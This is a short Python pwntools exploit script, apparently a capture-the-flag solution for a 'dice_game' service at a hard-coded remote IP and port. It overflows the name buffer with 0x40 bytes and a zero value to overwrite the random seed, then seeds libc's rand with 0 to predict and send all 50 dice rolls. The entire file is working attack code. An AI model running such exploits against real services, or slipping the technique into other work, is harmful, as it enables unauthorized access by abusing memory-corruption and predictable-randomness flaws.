from pwn import *
from ctypes import *


libc = cdll.LoadLibrary("/lib/x86_64-linux-gnu/libc.so.6")

r = remote('111.198.29.45', 52747)
#r = process("./dice_game")

payload = 'a' * 0x40 + p64(0)

r.recvuntil("name: ")
r.sendline(payload)


libc.srand(0)
for i in range(50):
    print r.recvuntil(": ")
    r.sendline(str(libc.rand() % 6 + 1))

print r.recv()
print r.recv()
